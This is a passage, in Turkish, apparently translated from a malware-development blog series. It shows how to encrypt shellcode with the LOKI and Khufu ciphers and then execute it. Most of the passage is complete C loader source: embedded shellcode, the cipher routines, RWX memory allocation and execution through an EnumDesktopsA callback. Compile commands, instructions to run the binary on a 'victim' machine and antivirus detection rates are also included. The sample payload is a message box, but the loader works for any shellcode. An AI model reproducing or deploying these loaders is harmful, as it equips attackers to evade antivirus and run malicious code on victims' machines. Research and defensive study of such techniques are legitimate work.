* https://cocomelonc.github.io/malware/2024/07/16/malware-cryptography-29.html
*/
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>
#include <windows.h>

#define ROUNDS 16
#define BLOCK_SIZE 8
#define KEY_SIZE 8

typedef uint32_t u32;
typedef uint8_t u8;

u8 key[KEY_SIZE] = {0x01, 0x23, 0x45, 0x67, 0x89, 0xAB, 0xCD, 0xEF};
void loki_encrypt(u8 *block, u8 *key) {
// LOKI encryption (simplified for demo)
u32 left = ((u32)block[0] << 24) | ((u32)block[1] << 16) |
((u32)block[2] << 8) | (u32)block[3];
u32 right = ((u32)block[4] << 24) | ((u32)block[5] << 16) |
((u32)block[6] << 8) | (u32)block[7];
for (int round = 0; round < ROUNDS; round++) {
u32 temp = right;
right = left ^ (right + ((u32)key[round % KEY_SIZE]));
left = temp;
}

block[0] = (left >> 24) & 0xFF;
block[1] = (left >> 16) & 0xFF;
block[2] = (left >> 8) & 0xFF;
block[3] = left & 0xFF;
827block[4] = (right >> 24) & 0xFF;
block[5] = (right >> 16) & 0xFF;
block[6] = (right >> 8) & 0xFF;
block[7] = right & 0xFF;
}

void loki_decrypt(u8 *block, u8 *key) {
// LOKI decryption (simplified for demo)
u32 left = ((u32)block[0] << 24) | ((u32)block[1] << 16) |
((u32)block[2] << 8) | (u32)block[3];
u32 right = ((u32)block[4] << 24) | ((u32)block[5] << 16) |
((u32)block[6] << 8) | (u32)block[7];

for (int round = ROUNDS - 1; round >= 0; round--) {
u32 temp = left;
left = right ^ (left + ((u32)key[round % KEY_SIZE]));
right = temp;
}

block[0] = (left >> 24) & 0xFF;
block[1] = (left >> 16) & 0xFF;
block[2] = (left >> 8) & 0xFF;
block[3] = left & 0xFF;
block[4] = (right >> 24) & 0xFF;
block[5] = (right >> 16) & 0xFF;
block[6] = (right >> 8) & 0xFF;
block[7] = right & 0xFF;
}

void loki_encrypt_shellcode(unsigned char* shellcode, int shellcode_len) {
int i;
for (i = 0; i < shellcode_len / BLOCK_SIZE; i++) {
	loki_encrypt(shellcode + i * BLOCK_SIZE, key);
}
// check if there are remaining bytes
int remaining = shellcode_len % BLOCK_SIZE;
if (remaining != 0) {
unsigned char pad[BLOCK_SIZE] =
{0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90};
memcpy(pad, shellcode + (shellcode_len / BLOCK_SIZE) * BLOCK_SIZE,
remaining);
loki_encrypt(pad, key);
memcpy(shellcode + (shellcode_len / BLOCK_SIZE) * BLOCK_SIZE, pad,
remaining);
}
}

void loki_decrypt_shellcode(unsigned char* shellcode, int shellcode_len) {
int i;
for (i = 0; i < shellcode_len / BLOCK_SIZE; i++) {
	loki_decrypt(shellcode + i * BLOCK_SIZE, key);
}
// check if there are remaining bytes
int remaining = shellcode_len % BLOCK_SIZE;
if (remaining != 0) {
unsigned char pad[BLOCK_SIZE] =
{0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90};
memcpy(pad, shellcode + (shellcode_len / BLOCK_SIZE) * BLOCK_SIZE,
remaining);
loki_decrypt(pad, key);
memcpy(shellcode + (shellcode_len / BLOCK_SIZE) * BLOCK_SIZE, pad,
remaining);
}
}

int main() {
unsigned char my_payload[] =
"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
"\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
"\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
"\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
"\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
"\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
"\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
"\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
"\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
"\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
"\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
"\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
"\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
"\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
"\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
"\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e"
"\x4c\x8d\x85\x25\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
"\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
"\xd5\x4d\x65\x6f\x77\x2d\x6d\x65\x6f\x77\x21\x00\x3d\x5e"
"\x2e\x2e\x5e\x3d\x00";

int my_payload_len = sizeof(my_payload);
int pad_len = my_payload_len + (8 - my_payload_len % 8) % 8;
unsigned char padded[pad_len];
memset(padded, 0x90, pad_len);
memcpy(padded, my_payload, my_payload_len);

printf("original shellcode: ");
for (int i = 0; i < my_payload_len; i++) {
	printf("%02x ", my_payload[i]);
}
printf("\n\n");

loki_encrypt_shellcode(padded, pad_len);

printf("encrypted shellcode: ");
for (int i = 0; i < pad_len; i++) {
	printf("%02x ", padded[i]);
}
printf("\n\n");

loki_decrypt_shellcode(padded, pad_len);

printf("decrypted shellcode: ");
for (int i = 0; i < my_payload_len; i++) {
	printf("%02x ", padded[i]);
}

printf("\n\n");

LPVOID mem = VirtualAlloc(NULL, my_payload_len, MEM_COMMIT,
PAGE_EXECUTE_READWRITE);
RtlMoveMemory(mem, padded, my_payload_len);
EnumDesktopsA(GetProcessWindowStation(), (DESKTOPENUMPROCA)mem, NULL);
return 0;
}
Gördüğünüz gibi, payload’u çalıştırmak için EnumDesktopsA tekniğini kullandım.

Ayrıca her zamanki gibi, basit olması için meow-meow messagebox payload’unu kullandım:
"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
"\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
"\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
"\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
"\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
"\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
"\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
"\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
"\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
"\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
"\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
"\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
"\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
"\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
"\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
"\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e"
"\x4c\x8d\x85\x25\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
"\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
"\xd5\x4d\x65\x6f\x77\x2d\x6d\x65\x6f\x77\x21\x00\x3d\x5e"
"\x2e\x2e\x5e\x3d\x00";
Doğruluğu kontrol etmek için karşılaştırma ve yazdırma mantığını ekledim.

demo

Hadi her şeyi çalışırken görelim. Derleyelim (kendi Kali makinemde):
x86_64-w64-mingw32-gcc -O2 hack.c -o hack.exe \
-I/usr/share/mingw-w64/include/ -s \
-ffunction-sections -fdata-sections -Wno-write-strings \
-fno-exceptions -fmerge-all-constants \
-static-libstdc++ -static-libgcc

+++++++++++++++++++++++++++++++++++++++++++++++
Ardından, bunu kurbanın makinesinde çalıştırın (benim durumumda Windows 11 x64):
.\hack.exe
+++++++++++++++++++++++++++++++++++++++++++++++
Gördüğünüz gibi, her şey mükemmel çalıştı! =..=


Shannon entropisini hesapla:
python3 entropy.py -f hack.exe
+++++++++++++++++++++++++++++++++++++++++++++++

.text bölümündeki payload’umuz.

Hadi bu hack.exe dosyasını VirusTotal'a yükleyelim:
+++++++++++++++++++++++++++++++++++++++++++++++
https://www.virustotal.com/gui/file/04bede4d03cd8f610fa90c4d41e1439e3adcd66069a378b9db4f94e62a7572cd/detection

Gördüğünüz gibi, yalnızca 73 AV motorundan 27'si dosyamızı kötü amaçlı olarak tespit etti.


Ancak, bu sonucun nedeni payload’un şifrelenmesi değil, VirtualAlloc, RtlMoveMemory ve EnumDesktopsA gibi bazı Windows API çağrılarıdır.


Biham ve Shamir, diferansiyel kriptanaliz kullanarak LOKI'yi 11 veya daha az turda verimli bir şekilde çözmeyi başardılar ve bu, brute force yöntemlerinden daha hızlıydı.


Umarım bu gönderi, kötü amaçlı yazılım araştırmacıları, C/C++ programcıları için faydalıdır, mavi takımın bu ilginç şifreleme tekniğinden haberdar olmasını sağlar ve kırmızı takımın cephaneliğine yeni bir silah ekler.
LOKI
Malware and cryptography 1
Gıthub’taki kaynak kod


93. Kötü amaçlı yazılım ve kriptografi araştırması - bölüm 2 (30): Khufu payload şifreleme. Basit C örneği.

﷽

+++++++++++++++++++++++++++++++++++++++++++++++

Bu gönderi, kötü amaçlı yazılım geliştirme sırasında Khufu Feistel şifreleme algoritmasını kullanma konusundaki kendi araştırmamın bir sonucudur. Her zamanki gibi, çeşitli kripto algoritmalarını keşfederken, bunu payload’u şifrelemek/şifresini çözmek için uygularsak ne olacağını kontrol etmeye karar verdim.
Khufu
Khufu, 64 bitlik veri blokları üzerinde çalışan bir kriptografik algoritmadır. 64 bitlik düz metin, başlangıçta her biri 32 bitten oluşan iki eşit yarıya bölünür. Bu yarılara L ve R adı verilir. Başlangıçta, her iki yarı da belirli bir anahtar malzemesi kümesiyle XOR işlemine tabi tutulur.
Daha sonra, DES’e benzeyen bir dizi turdan geçerler. Her döngü sırasında, bir S-kutusuna giriş, L'nin en az anlamlı baytıdır. Her S-kutusu 8 giriş biti ve 32 çıkış biti içerir. S-kutusundaki 32 bitlik eleman seçildikten sonra, XOR işlemi kullanılarak R ile birleştirilir. Ardından, L 8 bitin katları kadar döndürülür ve ardından L ve R yer değiştirir. Bu, turun sonunu işaret eder. S-kutusu dinamiktir ve her 8 turda bir ayarlamalara tabi tutulur.
Son olarak, önceki turun tamamlanmasının ardından, L ve R’nin değerleri ek anahtar malzemesi ile XOR işlemine tabi tutulur. Daha sonra, birlikte birleştirilerek şifreli metin bloğu oluşturulur.
pratik örnek
Öncelikle, önceden tanımlanmış değerlerle başlatılan 64 baytlık bir dizi (anahtar) gereklidir:
uint8_t key[KEY_SIZE] = {
0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F,
0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17,
0x18, 0x19, 0x1A, 0x1B, 0x1C, 0x1D, 0x1E, 0x1F,
0x20, 0x21, 0x22, 0x23, 0x24, 0x25, 0x26, 0x27,
0x28, 0x29, 0x2A, 0x2B, 0x2C, 0x2D, 0x2E, 0x2F,
0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37,
0x38, 0x39, 0x3A, 0x3B, 0x3C, 0x3D, 0x3E, 0x3F
};
Ayrıca, şifreleme ve şifre çözme sırasında yerine koyma işlemi için kullanılan 256 elemanlı bir dizi olan S-kutusu (sbox) gereklidir:
uint32_t sbox[256];
void khufu_generate_sbox(uint8_t *key, int round) {
for (int i = 0; i < 256; i++) {
sbox[i] = (key[(round * 8 + i) % KEY_SIZE] << 24) |
(key[(round * 8 + i + 1) % KEY_SIZE] << 16) |
(key[(round * 8 + i + 2) % KEY_SIZE] << 8) |
key[(round * 8 + i + 3) % KEY_SIZE];
}
}
Khufu S-kutusu oluşturma fonksiyonu - Bu fonksiyon, anahtarı kullanarak her tur için bir S-kutusu üretir. Her S-kutusu elemanı için fonksiyon, dört anahtar baytı (uygun şekilde kaydırılmış) birleştirerek 32 bitlik bir değer oluşturur.
Sıradaki fonksiyon Khufu şifreleme fonksiyonudur:
void khufu_encrypt(uint8_t *block, uint8_t *key) {
uint32_t left = ((uint32_t)block[0] << 24) | ((uint32_t)block[1] << 16) |
((uint32_t)block[2] << 8) | (uint32_t)block[3];
uint32_t right = ((uint32_t)block[4] << 24) | ((uint32_t)block[5] << 16) |
((uint32_t)block[6] << 8) | (uint32_t)block[7];

left ^= ((uint32_t)key[0] << 24) | ((uint32_t)key[1] << 16) | ((uint32_t)key
[2] << 8) | (uint32_t)key[3];
right ^= ((uint32_t)key[4] << 24) | ((uint32_t)key[5] << 16) | ((uint32_t)key
[6] << 8) | (uint32_t)key[7];

for (int round = 0; round < ROUNDS; round++) {
khufu_generate_sbox(key, round);
uint32_t temp = left;
left = right ^ sbox[left & 0xFF];
right = (temp >> 8) | (temp << 24);
uint32_t temp2 = left;
left = right;
right = temp2;
}

left ^= ((uint32_t)key[8] << 24) | ((uint32_t)key[9] << 16) | ((uint32_t)key
[10] << 8) | (uint32_t)key[11];
right ^= ((uint32_t)key[12] << 24) | ((uint32_t)key[13] << 16) | ((uint32_t)
key[14] << 8) | (uint32_t)key[15];

block[0] = (left >> 24) & 0xFF;
block[1] = (left >> 16) & 0xFF;
block[2] = (left >> 8) & 0xFF;
block[3] = left & 0xFF;
block[4] = (right >> 24) & 0xFF;
block[5] = (right >> 16) & 0xFF;
block[6] = (right >> 8) & 0xFF;
block[7] = right & 0xFF;
}
Burada ne oluyor? Öncelikle, 8 baytlık blok iki 32 bitlik yarıya (sol ve sağ) bölünür. Daha sonra, başlangıç anahtar planlaması sol ve sağ yarıları anahtar değerleriyle XOR işlemine tabi tutar. Her tur için:
Tur için S-kutusu oluşturulur.
Sol yarı, solun en az anlamlı baytı tarafından indekslenen S-kutusu değeriyle XORlanarak güncellenir.
Sağ yarı 8 bit döndürülür.
Sol ve sağ yarılar yer değiştirir.


Son anahtar planlaması, sol ve sağ yarıları anahtar değerleriyle XOR işlemine tabi tutar.
Sıradaki süreç şifre çözme işlemidir. Şifre çözme mantığı, şifreleme sürecinin tersidir:
void khufu_decrypt(uint8_t *block, uint8_t *key) {
uint32_t left = ((uint32_t)block[0] << 24) | ((uint32_t)block[1] << 16) |
((uint32_t)block[2] << 8) | (uint32_t)block[3];
uint32_t right = ((uint32_t)block[4] << 24) | ((uint32_t)block[5] << 16) |
((uint32_t)block[6] << 8) | (uint32_t)block[7];

left ^= ((uint32_t)key[8] << 24) | ((uint32_t)key[9] << 16) | ((uint32_t)key
[10] << 8) | (uint32_t)key[11];
right ^= ((uint32_t)key[12] << 24) | ((uint32_t)key[13] << 16) | ((uint32_t)
key[14] << 8) | (uint32_t)key[15];

for (int round = ROUNDS - 1; round >= 0; round--) {
uint32_t temp = right;
right = left ^ sbox[right & 0xFF];
left = (temp << 8) | (temp >> 24);
uint32_t temp2 = left;
left = right;
right = temp2;
}

left ^= ((uint32_t)key[0] << 24) | ((uint32_t)key[1] << 16) | ((uint32_t)key
[2] << 8) | (uint32_t)key[3];
right ^= ((uint32_t)key[4] << 24) | ((uint32_t)key[5] << 16) | ((uint32_t)key
[6] << 8) | (uint32_t)key[7];

block[0] = (left >> 24) & 0xFF;
block[1] = (left >> 16) & 0xFF;
block[2] = (left >> 8) & 0xFF;
block[3] = left & 0xFF;
block[4] = (right >> 24) & 0xFF;
block[5] = (right >> 16) & 0xFF;
block[6] = (right >> 8) & 0xFF;
block[7] = right & 0xFF;
}
Ana mantık, kabuk kodu şifreleme ve şifre çözme fonksiyonlarıdır:
void khufu_encrypt_shellcode(unsigned char* shellcode, int shellcode_len) {
int i;
for (i = 0; i < shellcode_len / BLOCK_SIZE; i++) {
khufu_encrypt(shellcode + i * BLOCK_SIZE, key);
}
// check if there are remaining bytes
int remaining = shellcode_len % BLOCK_SIZE;
if (remaining != 0) {
unsigned char pad[BLOCK_SIZE] =
{0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90};
memcpy(pad, shellcode + (shellcode_len / BLOCK_SIZE) * BLOCK_SIZE,
remaining);
khufu_encrypt(pad, key);
memcpy(shellcode + (shellcode_len / BLOCK_SIZE) * BLOCK_SIZE, pad,
remaining);
}
}

void khufu_decrypt_shellcode(unsigned char* shellcode, int shellcode_len) {
int i;
for (i = 0; i < shellcode_len / BLOCK_SIZE; i++) {
	khufu_decrypt(shellcode + i * BLOCK_SIZE, key);
}
// check if there are remaining bytes
int remaining = shellcode_len % BLOCK_SIZE;
if (remaining != 0) {
unsigned char pad[BLOCK_SIZE] =
{0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90};
memcpy(pad, shellcode + (shellcode_len / BLOCK_SIZE) * BLOCK_SIZE,
remaining);
khufu_decrypt(pad, key);
memcpy(shellcode + (shellcode_len / BLOCK_SIZE) * BLOCK_SIZE, pad,
remaining);
}
}
Görüldüğü gibi, kabuk kodu blok blok şifrelenir ve çözülür. Kabuk kodunun uzunluğu blok boyutunun katı değilse, şifreleme öncesinde (0x90) ile doldurulur ve şifre çözme sırasında uygun şekilde işlenir.
Son olarak, payload’u çalıştırmamız gerekiyor:
int main() {
unsigned char my_payload[] =
"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
"\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
"\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
"\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
"\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
"\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
"\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
"\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
"\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
"\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
"\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
"\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
"\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
"\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
"\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
"\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e"
"\x4c\x8d\x85\x25\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
"\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
"\xd5\x4d\x65\x6f\x77\x2d\x6d\x65\x6f\x77\x21\x00\x3d\x5e"
"\x2e\x2e\x5e\x3d\x00";

int my_payload_len = sizeof(my_payload);
int pad_len = my_payload_len + (8 - my_payload_len % 8) % 8;
unsigned char padded[pad_len];
memset(padded, 0x90, pad_len);
memcpy(padded, my_payload, my_payload_len);

printf("original shellcode: ");
for (int i = 0; i < my_payload_len; i++) {
	printf("%02x ", my_payload[i]);
}
printf("\n\n");

khufu_encrypt_shellcode(padded, pad_len);

printf("encrypted shellcode: ");
for (int i = 0; i < pad_len; i++) {
	printf("%02x ", padded[i]);
}
printf("\n\n");

khufu_decrypt_shellcode(padded, pad_len);

printf("decrypted shellcode: ");
for (int i = 0; i < my_payload_len; i++) {
	printf("%02x ", padded[i]);
}

printf("\n\n");

LPVOID mem = VirtualAlloc(NULL, my_payload_len, MEM_COMMIT,
PAGE_EXECUTE_READWRITE);
RtlMoveMemory(mem, padded, my_payload_len);
EnumDesktopsA(GetProcessWindowStation(), (DESKTOPENUMPROCA)mem, NULL);
return 0;
}

Her zamanki gibi, meow-meow mesaj kutusu payload’u kullandım:
unsigned char my_payload[] =
"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
"\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
"\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
"\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
"\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
"\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
"\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
"\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
"\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
"\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
"\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
"\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
"\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
"\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
"\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
"\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e"
"\x4c\x8d\x85\x25\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
"\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
"\xd5\x4d\x65\x6f\x77\x2d\x6d\x65\x6f\x77\x21\x00\x3d\x5e"
"\x2e\x2e\x5e\x3d\x00";
ve bunu EnumDesktopsA işlevine geri çağırma fonksiyonu olarak ileterek çalıştırdım.
Tam kaynak kodu şu şekildedir (hack.c):
/*
* hack.c
* encrypt/decrypt payload
* via Khufu algorith
* author: @cocomelonc
* https://cocomelonc.github.io/malware/2024/07/21/malware-cryptography-30.html
*/
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>
#include <windows.h>

#define ROUNDS 16
#define BLOCK_SIZE 8
#define KEY_SIZE 64

uint8_t key[KEY_SIZE] = {
0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F,
0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17,
0x18, 0x19, 0x1A, 0x1B, 0x1C, 0x1D, 0x1E, 0x1F,
0x20, 0x21, 0x22, 0x23, 0x24, 0x25, 0x26, 0x27,
0x28, 0x29, 0x2A, 0x2B, 0x2C, 0x2D, 0x2E, 0x2F,
0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37,
0x38, 0x39, 0x3A, 0x3B, 0x3C, 0x3D, 0x3E, 0x3F
};

uint32_t sbox[256];

void khufu_generate_sbox(uint8_t *key, int round) {
for (int i = 0; i < 256; i++) {
sbox[i] = (key[(round * 8 + i) % KEY_SIZE] << 24) |
(key[(round * 8 + i + 1) % KEY_SIZE] << 16) |
(key[(round * 8 + i + 2) % KEY_SIZE] << 8) |
key[(round * 8 + i + 3) % KEY_SIZE];
}
}

void khufu_encrypt(uint8_t *block, uint8_t *key) {
uint32_t left = ((uint32_t)block[0] << 24) | ((uint32_t)block[1] << 16) |
((uint32_t)block[2] << 8) | (uint32_t)block[3];
uint32_t right = ((uint32_t)block[4] << 24) | ((uint32_t)block[5] << 16) |
((uint32_t)block[6] << 8) | (uint32_t)block[7];

left ^= ((uint32_t)key[0] << 24) | ((uint32_t)key[1] << 16) |
((uint32_t)key[2] << 8) | (uint32_t)key[3];
right ^= ((uint32_t)key[4] << 24) | ((uint32_t)key[5] << 16) |
((uint32_t)key[6] << 8) | (uint32_t)key[7];

for (int round = 0; round < ROUNDS; round++) {
khufu_generate_sbox(key, round);
uint32_t temp = left;
left = right ^ sbox[left & 0xFF];
right = (temp >> 8) | (temp << 24);
uint32_t temp2 = left;
left = right;
right = temp2;
}

left ^= ((uint32_t)key[8] << 24) | ((uint32_t)key[9] << 16) |
((uint32_t)key[10] << 8) | (uint32_t)key[11];
right ^= ((uint32_t)key[12] << 24) | ((uint32_t)key[13] << 16) |
((uint32_t)key[14] << 8) | (uint32_t)key[15];

block[0] = (left >> 24) & 0xFF;
block[1] = (left >> 16) & 0xFF;
block[2] = (left >> 8) & 0xFF;
block[3] = left & 0xFF;
block[4] = (right >> 24) & 0xFF;
block[5] = (right >> 16) & 0xFF;
block[6] = (right >> 8) & 0xFF;
block[7] = right & 0xFF;
}

void khufu_decrypt(uint8_t *block, uint8_t *key) {
uint32_t left = ((uint32_t)block[0] << 24) | ((uint32_t)block[1] << 16) |
((uint32_t)block[2] << 8) | (uint32_t)block[3];
uint32_t right = ((uint32_t)block[4] << 24) | ((uint32_t)block[5] << 16) |
((uint32_t)block[6] << 8) | (uint32_t)block[7];
left ^= ((uint32_t)key[8] << 24) | ((uint32_t)key[9] << 16) | ((uint32_t)key
[10] << 8) | (uint32_t)key[11];
right ^= ((uint32_t)key[12] << 24) | ((uint32_t)key[13] << 16) | ((uint32_t)
key[14] << 8) | (uint32_t)key[15];

for (int round = ROUNDS - 1; round >= 0; round--) {
uint32_t temp = right;
right = left ^ sbox[right & 0xFF];
left = (temp << 8) | (temp >> 24);
uint32_t temp2 = left;
left = right;
right = temp2;
}

left ^= ((uint32_t)key[0] << 24) | ((uint32_t)key[1] << 16) |
((uint32_t)key[2] << 8) | (uint32_t)key[3];
right ^= ((uint32_t)key[4] << 24) | ((uint32_t)key[5] << 16) |
((uint32_t)key[6] << 8) | (uint32_t)key[7];

block[0] = (left >> 24) & 0xFF;
block[1] = (left >> 16) & 0xFF;
block[2] = (left >> 8) & 0xFF;
block[3] = left & 0xFF;
block[4] = (right >> 24) & 0xFF;
block[5] = (right >> 16) & 0xFF;
block[6] = (right >> 8) & 0xFF;
block[7] = right & 0xFF;
}

void khufu_encrypt_shellcode(unsigned char* shellcode, int shellcode_len) {
int i;
for (i = 0; i < shellcode_len / BLOCK_SIZE; i++) {
	khufu_encrypt(shellcode + i * BLOCK_SIZE, key);
}
// check if there are remaining bytes
int remaining = shellcode_len % BLOCK_SIZE;
if (remaining != 0) {
unsigned char pad[BLOCK_SIZE] =
{0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90};
memcpy(pad, shellcode + (shellcode_len / BLOCK_SIZE) * BLOCK_SIZE,
remaining);
khufu_encrypt(pad, key);
memcpy(shellcode + (shellcode_len / BLOCK_SIZE) * BLOCK_SIZE, pad,
remaining);
}
}

void khufu_decrypt_shellcode(unsigned char* shellcode, int shellcode_len) {
int i;
for (i = 0; i < shellcode_len / BLOCK_SIZE; i++) {
	khufu_decrypt(shellcode + i * BLOCK_SIZE, key);
}
// check if there are remaining bytes
int remaining = shellcode_len % BLOCK_SIZE;
if (remaining != 0) {
unsigned char pad[BLOCK_SIZE] =
